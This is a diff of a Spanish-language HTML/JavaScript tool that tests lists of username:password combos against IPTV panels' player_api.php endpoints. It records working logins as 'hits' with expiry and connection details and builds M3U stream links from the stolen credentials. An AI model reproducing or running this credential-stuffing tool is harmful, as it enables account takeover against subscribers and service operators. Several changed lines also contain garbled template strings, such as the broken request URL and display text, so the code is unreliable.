@@ -186,7 +186,6 @@
         .btn-del { background-color: var(--rojo-stop); }
         .btn-copy { background-color: #00bfa5; }
 
-        /* Jobs escáner */
         .job-card {
             background-color: #05070a;
             border: 1px solid #222;
@@ -305,7 +304,7 @@
         </div>
 
         <div id="panel-bloc" class="panel">
-            <h3>Bloc de Servidores &amp; URLs</h3>
+            <h3>Bloc de Servidores & URLs</h3>
             <div class="item-card" style="border:1px dashed var(--borde-neon)">
                 <input type="hidden" id="editUrlId" value="">
                 <div class="form-group">
@@ -502,7 +501,7 @@
 
             document.getElementById('auth-screen').style.display = 'none';
             document.getElementById('main-app').style.display = 'block';
-            document.getElementById('userDisplay').textContent = `Admin Activo: ${email} (${elRol})`;
+            document.getElementById('userDisplay').textContent = `Admin Activo: \( {email} ( \){elRol})`;
 
             if (elRol === "Owner") {
                 document.getElementById('tabAdminBtn').style.display = 'block';
@@ -527,7 +526,6 @@
             document.getElementById('main-app').style.display = 'none';
         }
 
-        // --- CREAR VENDEDOR CORREGIDO ---
         function crearVendedorFirebase() {
             const emailVendedor = document.getElementById("newAdminEmail").value.trim();
             const passVendedor = document.getElementById("newAdminPass").value.trim();
@@ -739,7 +737,13 @@
             if(!baseHits[usernameClave]) baseHits[usernameClave] = [];
             if (baseHits[usernameClave].some(h => h.user === user && h.pass === pass)) return;
 
-            baseHits[usernameClave].push({ id: Date.now() + Math.random(), user, pass, texto: hitTexto, copies: 0 });
+            baseHits[usernameClave].push({ 
+                id: Date.now() + Math.random(), 
+                user, 
+                pass, 
+                texto: hitTexto, 
+                copies: 0 
+            });
             localStorage.setItem('sys_saved_hits', JSON.stringify(baseHits));
             renderizarBancoHits();
         }
@@ -820,6 +824,7 @@
             }
         }
 
+        // ==================== FUNCIÓN ACTUALIZADA CON TU FORMATO ====================
         async function processarCombosJob(host, combos, conc, jobId){
             let total = combos.length, processed = 0, index = 0;
             const fill = document.getElementById(jobId === 1 ? 'progressBarFill' : (jobId === 2 ? 'progressBarFill2' : 'progressBarFill3'));
@@ -833,35 +838,56 @@
                     const pair = extractCombo(combos[i]); if(!pair) continue;
                     const [user, pass] = pair;
 
-                    userDisp.textContent = `Usuario: ${user}:${pass}`;
+                    userDisp.textContent = `Usuario: \( {user}: \){pass}`;
+
                     try {
-                        const url = `http://${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
+                        const url = `http://\( {host}/player_api.php?username= \){encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
                         const res = await fetchWithCors(url, { cache: 'no-store' });
                         const data = await res.json();
                         
-                               if(data && data.user_info && (data.user_info.status === 'Active' || data.user_info.auth == 1)) {
-                    
-                    // --- SONIDO ---
-                    if(document.getElementById('soundToggle').checked) {
-                        audioHit.play().catch(e => console.log("Sonido bloqueado"));
-                    }
+                        if(data && data.user_info && (data.user_info.status === 'Active' || data.user_info.auth == 1)) {
+                            
+                            const exp = data.user_info.exp_date 
+                                ? new Date(data.user_info.exp_date * 1000).toISOString().replace('T', ' ').slice(0, 19) 
+                                : 'Ilimitado';
 
-                    const exp = data.user_info.exp_date ? new Date(data.user_info.exp_date*1000).toLocaleDateString() : 'Ilimitado';
-                    
-                    // --- FORMATO M3U ---
-                    const m3uLink = `http://${host}/get.php?username=${user}&password=${pass}&type=m3u_plus`;
-                    const texto = `🔥 HIT ENCONTRADO 🔥\n🌐 Host: ${host}\n👤 Usuario: ${user}\n🔑 Pass: ${pass}\n⏳ Expira: ${exp}\n\n🔗 LISTA M3U:\n${m3uLink}`;
-                    
-                    HITS[jobId].push({ user, pass, texto });
-                    countSpan.innerHTML = `Hits: <span class="yellow-hit">${HITS[jobId].length}</span>`;
-                    
-                    const div = document.createElement('div');
-                    div.className = 'hit-block';
-                    // Se usa white-space: pre-wrap para que el link no se corte
-                    div.innerHTML = `<pre class="hit-content" style="white-space: pre-wrap; word-break: break-all;">${texto}</pre>`;
-                    hitsContainer.prepend(div);
-                    guardarHitEnBanco(texto, user, pass);
-                }
+                            const dominio = host.split(':')[0];
+                            const fullHost = `http://${host}`;
+                            const m3uLink = `http://\( {host}/get.php?username= \){user}&password=${pass}&type=m3u_plus`;
+
+                            const texto = `── Host ➤ ${fullHost}
+├── Dominio ➤ http://${dominio}
+├── User ➤ ${user}
+├── Pass ➤ ${pass}
+├── Exp. ➤ ${exp}
+├── Act Con ➤ ${data.user_info.active_cons || 0}
+├── Max Con ➤ ${data.user_info.max_connections || 0}
+├── Status ➤ ${data.user_info.status || 'Active'}
+╰─➤Zona➤ ${data.server_info?.timezone || 'America/Santiago'}
+
+╭─➤Chanel info
+├  🎩CANALES EN VIVO ➤ ${data.categories?.live?.length || 'N/A'}
+├  🎩VIDEOS  Y  PELIS    ➤ ${data.categories?.movie?.length || 'N/A'}
+├  🎩SERIES VARIADAS  ➤ ${data.categories?.series?.length || 'N/A'}
+╰─➤    
+
+╭─➤🄼➂🅄 
+├  ${m3uLink}`;
+
+                            if(document.getElementById('soundToggle').checked) {
+                                audioHit.play().catch(e => console.log("Sonido bloqueado"));
+                            }
+
+                            HITS[jobId].push({ user, pass, texto });
+                            countSpan.innerHTML = `Hits: <span class="yellow-hit">${HITS[jobId].length}</span>`;
+
+                            const div = document.createElement('div');
+                            div.className = 'hit-block';
+                            div.innerHTML = `<pre class="hit-content" style="white-space: pre-wrap; word-break: break-all;">${texto}</pre>`;
+                            hitsContainer.prepend(div);
+
+                            guardarHitEnBanco(texto, user, pass);
+                        }
 
                     }catch(_){}
                     finally {
@@ -911,8 +937,8 @@
         });
 
         stopBtn.addEventListener('click', () => stopRequested = true);
-// Variable para el sonido
-const audioHit = new Audio('https://actions.google.com/sounds/v1/notifications/beep_short.ogg');
+
+        const audioHit = new Audio('https://actions.google.com/sounds/v1/notifications/beep_short.ogg');
 
     </script>
 </body>
